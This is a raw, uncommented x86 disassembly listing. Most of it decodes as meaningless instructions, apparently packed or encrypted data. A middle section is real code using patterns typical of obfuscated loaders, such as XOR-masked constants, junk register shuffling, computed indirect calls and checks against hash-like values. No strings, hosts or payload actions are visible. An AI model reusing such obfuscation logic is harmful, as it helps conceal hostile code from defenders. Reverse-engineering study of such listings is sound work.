  40cb68:	jb     0x40cb70
  40cb6a:	mov    ebp,0xda25a063
  40cb6f:	and    DWORD PTR [eax-0x6],0xfaf1a97d
  40cb76:	cld    
  40cb77:	invd   
  40cb79:	out    dx,al
  40cb7a:	xchg   BYTE PTR [edx+0x41],bl
  40cb7d:	or     al,0x92
  40cb7f:	xor    ch,BYTE PTR [esi+eiz*1]
  40cb82:	repnz test eax,0xf3bd5b98
  40cb88:	and    al,0xc9
  40cb8a:	dec    edi
  40cb8b:	dec    ebx
  40cb8c:	push   es
  40cb8d:	mov    al,0x5d
  40cb8f:	cli    
  40cb90:	sti    
  40cb91:	or     ch,dl
  40cb93:	dec    ebp
  40cb94:	les    esi,FWORD PTR [eax]
  40cb96:	adc    DWORD PTR [ebp-0x52],0x15
  40cb9a:	jge    0x40cb7c
  40cb9c:	fmul   DWORD PTR [edx-0x6546f8c0]
  40cba2:	mov    ebp,0xcd7caeae
  40cba7:	push   eax
  40cba8:	(bad)  
  40cba9:	sbb    DWORD PTR [eax+0x5],edx
  40cbac:	and    BYTE PTR [edx-0x132aa82c],dh
  40cbb2:	loopne 0x40cbb8
  40cbb4:	pop    ss
  40cbb5:	int3   
  40cbb6:	lea    ecx,[edx]
  40cbb8:	daa    
  40cbb9:	dec    esp
  40cbba:	sbb    al,0x4
  40cbbc:	enter  0x5b76,0x6a
  40cbc0:	add    DWORD PTR [eax+edi*8+0xa10d0c3],eax
  40cbc7:	call   0x53514e30
  40cbcc:	cwde   
  40cbcd:	add    BYTE PTR [esi+0x5fc97a0d],0x87
  40cbd4:	dec    edi
  40cbd5:	je     0x40cb69
  40cbd7:	sub    DWORD PTR [ebx+edi*1+0x13],ebp
  40cbdb:	(bad)  
  40cbdc:	jnp    0x40cba4
  40cbde:	daa    
  40cbdf:	cmp    DWORD PTR [ecx+0x66],esp
  40cbe2:	and    al,0xeb
  40cbe4:	xlat   BYTE PTR ds:[ebx]
  40cbe5:	retf   
  40cbe6:	mov    ebp,0x82495a39
  40cbeb:	stos   BYTE PTR es:[edi],al
  40cbec:	or     eax,0x7d58f259
  40cbf1:	xor    eax,0xe4b43b97
  40cbf6:	out    dx,al
  40cbf7:	jp     0x40cc37
  40cbf9:	jle    0x40cbb1
  40cbfb:	jne    0x40cc4a
  40cbfd:	mov    WORD PTR [eax+0x17],fs
  40cc00:	and    edx,DWORD PTR [eax+0x33]
  40cc03:	xchg   edx,eax
  40cc04:	mov    al,0xa0
  40cc06:	pushf  
  40cc07:	mov    ds:0x6ae3c97f,eax
  40cc0c:	ja     0x40cc12
  40cc0e:	pop    ebp
  40cc0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc10:	in     al,dx
  40cc11:	scas   al,BYTE PTR es:[edi]
  40cc12:	loope  0x40cbaf
  40cc14:	or     BYTE PTR [eax],al
  40cc16:	repz add ebp,ebx
  40cc19:	cmp    DWORD PTR [edx-0x4c],esi
  40cc1c:	push   edi
  40cc1d:	lods   al,BYTE PTR ds:[esi]
  40cc1e:	push   edx
  40cc1f:	call   DWORD PTR [edi+0x8]
  40cc22:	xlat   BYTE PTR ds:[ebx]
  40cc23:	outs   dx,DWORD PTR ds:[esi]
  40cc24:	mov    esp,0xee61a8f4
  40cc29:	jns    0x40cca9
  40cc2b:	cmp    DWORD PTR [ebx-0x5f],ebp
  40cc2e:	sub    al,0x8b
  40cc30:	repz push es
  40cc32:	(bad)  
  40cc33:	loope  0x40cbea
  40cc35:	test   al,0xba
  40cc37:	pop    esp
  40cc38:	cmc    
  40cc39:	sub    BYTE PTR [ecx],ch
  40cc3b:	mov    esp,DWORD PTR [ebp+0x32]
  40cc3e:	xor    al,0x87
  40cc40:	push   esi
  40cc41:	and    eax,0xd988929a
  40cc46:	jmp    0x40cc7b
  40cc48:	mov    ah,0xef
  40cc4a:	je     0x40cbf0
  40cc4c:	iret   
  40cc4d:	rcl    DWORD PTR [ebx-0x3],cl
  40cc50:	mov    DWORD PTR [edx+0x14f0340d],edx
  40cc56:	mov    ds:0xa7ddc49d,al
  40cc5b:	and    al,0xa3
  40cc5d:	iret   
  40cc5e:	jae    0x40cc70
  40cc60:	outs   dx,DWORD PTR ds:[esi]
  40cc61:	mov    al,ds:0x4963ffeb
  40cc66:	mov    bh,0xc2
  40cc68:	pop    ebx
  40cc69:	sar    DWORD PTR [esi+0x24d76654],cl
  40cc6f:	jle    0x40cccd
  40cc71:	scas   al,BYTE PTR es:[edi]
  40cc72:	imul   esi,edx,0xa6931181
  40cc78:	sub    bh,BYTE PTR [edx+0x45]
  40cc7b:	not    DWORD PTR [esi-0x63]
  40cc7e:	cld    
  40cc7f:	push   edi
  40cc80:	inc    esi
  40cc81:	jno    0x40cc4d
  40cc83:	mov    ebp,0xebefefa8
  40cc88:	out    dx,eax
  40cc89:	adc    DWORD PTR ds:0x154108b,ecx
  40cc8f:	or     DWORD PTR [ecx+esi*1-0x1d],0xffffff9a
  40cc94:	daa    
  40cc95:	cmp    al,0x79
  40cc97:	pop    ss
  40cc98:	xor    BYTE PTR [ecx],0xa9
  40cc9b:	add    al,0x41
  40cc9e:	push   edx
  40cc9f:	xchg   BYTE PTR [edx],bl
  40cca1:	into   
  40cca2:	sub    ch,dl
  40cca4:	inc    edx
  40cca5:	aam    0x4
  40cca7:	clc    
  40cca8:	mov    ah,BYTE PTR [ecx+0x14]
  40ccab:	jmp    0x40cc95
  40ccad:	cmc    
  40ccae:	push   esp
  40ccaf:	shr    BYTE PTR [esi],cl
  40ccb1:	xchg   ecx,eax
  40ccb2:	bound  ecx,QWORD PTR [ecx-0x6d]
  40ccb5:	stc    
  40ccb6:	adc    dl,BYTE PTR [esi-0x1d]
  40ccb9:	call   0xc5e7f43b
  40ccbe:	cmp    DWORD PTR [edi+0x10],edx
  40ccc1:	push   ebx
  40ccc2:	(bad)  [esp+eiz*2]
  40ccc5:	out    0x24,eax
  40ccc7:	jne    0x40cd0d
  40ccc9:	jno    0x40cce9
  40cccb:	add    al,0x31
  40cccd:	sub    DWORD PTR [edx-0x75],edx
  40ccd0:	cmp    al,BYTE PTR [esi]
  40ccd2:	(bad)  
  40ccd4:	sub    eax,DWORD PTR [edi]
  40ccd6:	pop    ecx
  40ccd7:	pop    eax
  40ccd8:	ins    BYTE PTR es:[edi],dx
  40ccd9:	dec    eax
  40ccda:	in     al,0x17
  40ccdc:	aad    0x35
  40ccde:	push   0x284b3821
  40cce3:	cs dec esi
  40cce5:	xor    eax,0x13cd8262
  40ccea:	stos   BYTE PTR es:[edi],al
  40cceb:	in     al,0xc0
  40cced:	jb     0x40cd0a
  40ccef:	cmp    cl,ch
  40ccf1:	hlt    
  40ccf2:	xor    ah,ch
  40ccf4:	xor    DWORD PTR [ebp+0x6953c197],esp
  40ccfa:	cmp    eax,esi
  40ccfc:	test   DWORD PTR [eax-0xc],0xdbc3b0b7
  40cd03:	add    esi,0xec7b60e3
  40cd09:	adc    BYTE PTR [ecx+0x5f],bh
  40cd0c:	mov    al,ds:0x3b67ee02
  40cd11:	mov    ds:0x360e2186,al
  40cd16:	or     al,0x53
  40cd18:	sbb    cl,BYTE PTR [ecx]
  40cd1a:	or     bl,BYTE PTR ds:0xd5624a73
  40cd20:	mov    ah,0xc9
  40cd22:	jb     0x40cd4a
  40cd24:	xchg   ebx,eax
  40cd25:	push   esp
  40cd26:	jp     0x40cd9f
  40cd28:	dec    eax
  40cd29:	or     al,0x77
  40cd2b:	and    BYTE PTR ds:0x8136186a,cl
  40cd31:	in     eax,dx
  40cd32:	pop    ds
  40cd33:	mov    ds,WORD PTR [esi+0x2e]
  40cd36:	sbb    dl,0x8
  40cd39:	dec    esp
  40cd3a:	stc    
  40cd3b:	mov    ah,0xf8
  40cd3d:	mov    cs,WORD PTR [ecx+0x6c]
  40cd40:	stos   BYTE PTR es:[edi],al
  40cd41:	shl    al,0x27
  40cd44:	cli    
  40cd45:	dec    ecx
  40cd46:	or     edx,DWORD PTR [edx]
  40cd48:	aam    0xf5
  40cd4a:	xor    al,0x15
  40cd4c:	adc    al,0xbf
  40cd4e:	aaa    
  40cd4f:	and    cl,BYTE PTR [ecx]
  40cd51:	jnp    0x40cd33
  40cd53:	sub    DWORD PTR [eax],ebp
  40cd55:	add    DWORD PTR [edx-0x7f7a6769],esp
  40cd5b:	out    dx,eax
  40cd5c:	icebp  
  40cd5d:	or     cl,dh
  40cd5f:	sbb    BYTE PTR [eax-0x6f],bh
  40cd62:	js     0x40cdd6
  40cd64:	cs jns 0x40cd34
  40cd67:	bound  edx,QWORD PTR [ebx-0x1bdefeaf]
  40cd6d:	bound  ebp,QWORD PTR [eax]
  40cd6f:	pcmpgtd mm2,mm1
  40cd72:	adc    eax,0x538b0b78
  40cd77:	cmp    eax,edx
  40cd79:	pop    edx
  40cd7a:	and    ebp,edx
  40cd7c:	pusha  
  40cd7d:	and    al,BYTE PTR [ecx+0x12]
  40cd80:	idiv   BYTE PTR [ebp+0x31]
  40cd83:	test   ah,bl
  40cd85:	std    
  40cd86:	in     eax,dx
  40cd87:	fadd   DWORD PTR [eax-0x6d]
  40cd8a:	or     BYTE PTR [esi+eax*4],bl
  40cd8d:	and    DWORD PTR [edx],ecx
  40cd8f:	sbb    ebx,ecx
  40cd91:	sub    BYTE PTR [ebx-0x5b7cf524],dh
  40cd97:	(bad)  
  40cd99:	mov    eax,ds:0xd0b3edea
  40cd9e:	repz cmp BYTE PTR [ecx],dh
  40cda1:	xchg   ebp,eax
  40cda2:	mov    eax,0xf04ceb52
  40cda7:	cmp    al,0xa
  40cda9:	push   cs
  40cdaa:	mov    ah,0xce
  40cdac:	and    al,0xde
  40cdae:	and    al,0xee
  40cdb0:	cli    
  40cdb1:	inc    ecx
  40cdb2:	mul    BYTE PTR [bp+di]
  40cdb5:	imul   eax,esp,0x41c29497
  40cdbb:	mov    al,ds:0xa276ca2a
  40cdc0:	gs add eax,0x759263be
  40cdc6:	dec    esp
  40cdc7:	retf   
  40cdc8:	mov    eax,gs:0x6166cd22
  40cdce:	rcr    DWORD PTR [edx],0xb0
  40cdd1:	pop    ds
  40cdd2:	cmp    DWORD PTR [edi+edx*4],edx
  40cdd5:	dec    edx
  40cdd6:	pop    esp
  40cdd7:	aad    0xf9
  40cdd9:	xchg   esp,eax
  40cdda:	cmp    ebx,DWORD PTR [esi+0x6b]
  40cddd:	push   esi
  40cdde:	add    eax,0xdf084a84
  40cde3:	fisub  DWORD PTR [ecx]
  40cde5:	ret    
  40cde6:	adc    dh,BYTE PTR [eax+0x63]
  40cde9:	push   ds
  40cdea:	pop    ebp
  40cdeb:	and    esp,ebx
  40cded:	sub    BYTE PTR [ebp-0x7eabb98e],cl
  40cdf3:	xchg   esp,eax
  40cdf4:	dec    edi
  40cdf5:	jmp    0x40ce4c
  40cdf7:	push   ecx
  40cdf8:	sub    eax,0xd4a3d750
  40cdfd:	stos   DWORD PTR es:[edi],eax
  40cdfe:	nop
  40cdff:	and    ecx,DWORD PTR [edi-0xc71c413]
  40ce05:	adc    ecx,DWORD PTR [edx]
  40ce07:	mov    cl,0x35
  40ce09:	in     eax,0x92
  40ce0b:	mov    ah,BYTE PTR [edi-0x79ddb885]
  40ce11:	or     eax,ebp
  40ce13:	jnp    0x40cdd1
  40ce15:	and    dh,0x54
  40ce18:	dec    eax
  40ce19:	sub    edx,DWORD PTR [eax+0x160f8d54]
  40ce1f:	arpl   ax,bp
  40ce21:	std    
  40ce22:	sub    BYTE PTR [edx-0x1d],dl
  40ce25:	cmp    bl,dl
  40ce27:	pop    ebx
  40ce28:	push   ebp
  40ce29:	stc    
  40ce2a:	cmp    esp,DWORD PTR [edx+0x4]
  40ce2d:	mov    cl,0x26
  40ce2f:	ds je  0x40ce00
  40ce32:	pusha  
  40ce33:	sub    eax,0xe41b51b8
  40ce38:	inc    edx
  40ce39:	mov    eax,0x1cc957a0
  40ce3e:	imul   edx,DWORD PTR [edi-0x28],0x4003a9ab
  40ce45:	mov    bl,0xb1
  40ce47:	cmp    ecx,eax
  40ce49:	je     0x40cec0
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c56
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42385a
  40cf91:	push   0x423812
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a76
  40cff7:	mov    ebx,DWORD PTR ds:0x421a9e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c56
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cda
  40d0ed:	mov    esi,DWORD PTR ds:0x421cd2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421cd2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	push   ebp
  40d112:	dec    esi
  40d113:	retf   
  40d114:	mov    al,0xc2
  40d116:	shl    DWORD PTR [edx+0x62],1
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx+0x35]
  40d11e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d11f:	cwde   
  40d120:	fst    QWORD PTR [eax-0x7bc98d7c]
  40d126:	or     DWORD PTR [edi-0x4f86ee49],ebx
  40d12c:	sub    BYTE PTR [edx],0x1c
  40d12f:	mov    BYTE PTR [ebx+edi*2],0xdd
  40d133:	pop    gs
  40d135:	or     DWORD PTR [ebx+ebx*2],ebx
  40d138:	sbb    eax,0x4ad8ee
  40d13d:	xchg   edi,eax
  40d13e:	aam    0x90
  40d140:	sar    BYTE PTR [ebp-0x63],0x24
  40d144:	mov    eax,ds:0x55be2990
  40d149:	minps  xmm4,XMMWORD PTR [edx]
  40d14c:	cmp    bh,BYTE PTR [edx]
  40d14e:	sub    al,BYTE PTR [ebx-0x13]
  40d151:	aas    
  40d152:	mov    edx,DWORD PTR [edx]
  40d154:	in     al,dx
  40d155:	dec    ebp
  40d156:	aam    0x1d
  40d158:	test   eax,0xce2d657
  40d15d:	lods   eax,DWORD PTR ss:[esi]
  40d15f:	iret   
  40d160:	push   edi
  40d161:	icebp  
  40d162:	test   al,0xc7
  40d164:	sub    al,0x3f
  40d166:	mov    cl,0x99
  40d168:	ds jecxz 0x40d1e6
  40d16b:	scas   al,BYTE PTR es:[edi]
  40d16c:	mov    esi,0x3ecc0a0d
  40d171:	jnp    0x40d179
  40d173:	inc    ebp
  40d174:	add    BYTE PTR [ecx+esi*8+0x33],dl
  40d178:	out    0xc5,al
  40d17a:	js     0x40d104
  40d17c:	cli    
  40d17d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d17e:	adc    BYTE PTR [edx-0x51],ch
  40d181:	je     0x40d13c
  40d183:	lods   eax,DWORD PTR ds:[esi]
  40d184:	call   0x910:0x96014ce5
  40d18b:	jl     0x40d15f
  40d18d:	sbb    al,0x29
  40d18f:	dec    ebx
  40d190:	jecxz  0x40d201
  40d192:	xor    eax,0x26223912
  40d197:	add    ebx,ebp
  40d199:	pop    ecx
  40d19a:	push   ecx
  40d19b:	fsubr  st(1),st
  40d19d:	hlt    
  40d19e:	xchg   edx,eax
  40d19f:	mov    ebp,0x6682c14d
  40d1a4:	cmp    DWORD PTR [edx+0x4cc74872],ecx
  40d1aa:	jmp    0x40d1c3
  40d1ac:	jnp    0x40d1a0
  40d1ae:	or     eax,0x270a6995
  40d1b3:	(bad)  
  40d1b4:	mov    eax,0x395d7298
  40d1b9:	or     ebx,DWORD PTR [esi-0x3f5ccada]
  40d1bf:	mov    ecx,0x1ef9457c
  40d1c4:	sub    BYTE PTR [edi+0x32],al
  40d1c7:	das    
  40d1c8:	adc    DWORD PTR [ebx+ebx*1-0x4e],edi
  40d1cc:	cmp    DWORD PTR [ebx+edi*1-0x322cd6e9],edx
  40d1d3:	gs daa 
  40d1d5:	fadd   DWORD PTR [edx]
  40d1d7:	mov    cl,0xb1
  40d1d9:	rcl    al,1
  40d1db:	ret    
  40d1dc:	xor    eax,0x62ba1f48
  40d1e1:	ret    0x3b8e
  40d1e4:	fsubrp st(5),st
  40d1e6:	jge    0x40d226
  40d1e8:	xchg   ebp,eax
  40d1e9:	jmp    0x40d183
  40d1eb:	push   0xab9177fe
  40d1f0:	mov    ebp,0x4ee87c71
  40d1f5:	xor    BYTE PTR [esi-0x2ff409c6],bh
  40d1fb:	sti    
  40d1fc:	sti    
  40d1fd:	shl    dh,1
  40d1ff:	pop    ebp
  40d200:	push   ebx
  40d201:	test   al,0xd4
  40d203:	xchg   BYTE PTR [edx+0x54],bl
  40d206:	jle    0x40d222
  40d208:	call   0x273bf85c
  40d20d:	inc    eax
  40d20e:	cs inc edi
  40d210:	push   esi
  40d211:	add    BYTE PTR [esi-0x6b],0x28
  40d215:	mov    eax,gs
  40d217:	(bad)  
  40d218:	mov    ecx,0x1334c910
  40d21d:	push   edi
  40d21e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d21f:	xor    DWORD PTR [ebx+0x7c],edi
  40d222:	add    esi,DWORD PTR ds:0x9aeda570
  40d228:	lahf   
  40d229:	ret    
  40d22a:	es scas al,BYTE PTR es:[edi]
  40d22c:	stos   BYTE PTR es:[edi],al
  40d22d:	jmp    0x40d25b
  40d22f:	jle    0x40d1cf
  40d231:	cld    
  40d232:	popf   
  40d233:	sbb    ebx,ecx
  40d235:	cwde   
  40d236:	mov    ecx,0xc2f87288
  40d23b:	fs daa 
  40d23d:	jne    0x40d202
  40d23f:	xlat   BYTE PTR ds:[ebx]
  40d240:	sar    ah,cl
  40d242:	int    0xb8
  40d244:	add    eax,0xb7dc569e
  40d249:	jae    0x40d205
  40d24b:	ror    bl,cl
  40d24d:	(bad)  
  40d24e:	sar    DWORD PTR [edx+0x6d55b5a5],cl
  40d254:	mov    ch,0xb0
  40d256:	mov    BYTE PTR [eax-0x5427ec7d],dl
  40d25c:	cmp    DWORD PTR [esi-0x38],ecx
  40d25f:	bound  esi,QWORD PTR [edx]
  40d261:	das    
  40d262:	sub    ch,BYTE PTR [eax+eax*1-0x1e]
  40d266:	xchg   ecx,eax
  40d267:	fcmovb st,st(5)
  40d269:	stos   BYTE PTR es:[edi],al
  40d26a:	dec    edx
  40d26b:	xchg   dl,bh
  40d26d:	(bad)
  40d270:	outs   dx,BYTE PTR ds:[esi]
  40d271:	fbstp  TBYTE PTR [esi+0x69]
  40d274:	mov    eax,ds:0xaed57fdc
  40d279:	out    dx,al
  40d27a:	scas   al,BYTE PTR es:[edi]
  40d27b:	xor    ecx,0x6ded9cb4
  40d281:	ret    0x13f4
  40d284:	cmp    ah,BYTE PTR [ebx-0x50da7510]
  40d28a:	push   eax
  40d28b:	inc    ebx
  40d28c:	push   ebx
  40d28d:	sbb    edx,0xffffffc7
  40d290:	sub    esi,ecx
  40d292:	sti    
  40d293:	fistp  DWORD PTR [ebp-0x4eea3f8e]
  40d299:	ficomp DWORD PTR [ecx+0x5d9c3cf5]
  40d29f:	sahf   
  40d2a0:	in     eax,0xdb
  40d2a2:	inc    edi
  40d2a3:	push   esp
  40d2a4:	loopne 0x40d303
  40d2a6:	xor    DWORD PTR [ecx-0x43],eax
  40d2a9:	stos   BYTE PTR es:[edi],al
  40d2aa:	data16 cmp al,0x47
  40d2ad:	mov    al,0x7e
  40d2af:	push   ss
  40d2b0:	ja     0x40d264
  40d2b2:	das    
  40d2b3:	outs   dx,BYTE PTR ds:[esi]
  40d2b4:	cli    
  40d2b5:	test   eax,0xf8707f73
  40d2ba:	push   eax
  40d2bb:	xchg   ecx,eax
  40d2bc:	mov    dl,0xd8
  40d2be:	inc    ebp
  40d2bf:	and    eax,0xc474fa0
  40d2c4:	(bad)  
  40d2c5:	mov    ebp,0x817af565
  40d2ca:	xor    al,0xa1
  40d2cc:	sub    eax,0x2eb39e2d
  40d2d1:	es into 
  40d2d3:	inc    ecx
  40d2d4:	cmp    bh,BYTE PTR [edx+edi*1-0x73e77c7a]
  40d2db:	cmp    cl,0x2
  40d2de:	push   ecx
  40d2df:	push   ss
  40d2e0:	push   0xa808bff0
  40d2e5:	pop    ss
  40d2e6:	xor    BYTE PTR [ebp-0x476c4572],al
  40d2ec:	lods   eax,DWORD PTR ds:[esi]
  40d2ed:	(bad)  
  40d2ee:	push   eax
  40d2ef:	mov    ds:0x32d9ae71,eax
  40d2f4:	test   DWORD PTR [eax-0x207f4a93],ebp
  40d2fa:	push   ebx
  40d2fb:	push   cs
  40d2fc:	xor    cl,al
  40d2fe:	push   es
  40d2ff:	mov    bl,0x58
  40d301:	fxtract 
  40d303:	mov    esi,0x3c2e156e
  40d308:	jns    0x40d28b
  40d30a:	push   cs
  40d30b:	(bad)  [edi-0x49]
  40d30e:	cs mov ah,0xa0
  40d311:	xor    BYTE PTR [edi+0x180a2c28],al
  40d317:	cmp    BYTE PTR [ebx+0x18],ah
  40d31a:	mov    ebp,0xb6b9dd69
  40d31f:	and    al,0xae
  40d321:	push   cs
  40d322:	inc    edi
  40d323:	mov    edx,0xe6874dc5
  40d328:	or     edi,ebx
  40d32a:	pop    esp
  40d32b:	inc    ebx
  40d32c:	push   cs
  40d32d:	push   esi
  40d32e:	mov    ebp,0x629331af
  40d333:	xchg   esi,eax
  40d334:	jns    0x40d322
  40d336:	sub    al,0xbb
  40d338:	adc    cl,ch
  40d33a:	cmc    
  40d33b:	pop    edi
  40d33c:	arpl   WORD PTR [edx+ebx*4],di
  40d33f:	xor    BYTE PTR [eax+0x21],ch
  40d342:	popa   
  40d343:	sbb    esi,esp
  40d345:	push   ebp
  40d346:	pop    ds
  40d347:	cdq    
  40d348:	in     al,0x3a
  40d34a:	add    eax,0x55abb372
  40d34f:	dec    DWORD PTR [edx+0x308b7c02]
  40d355:	mov    al,ds:0x6f6ea430
  40d35a:	xor    al,0xff
  40d35c:	mov    ecx,DWORD PTR [ebx-0x3640ada8]
  40d362:	cmp    al,0x43
  40d364:	int3   
  40d365:	jns    0x40d386
  40d367:	or     DWORD PTR [eax+ebp*8-0x1f],ecx
  40d36b:	pop    ss
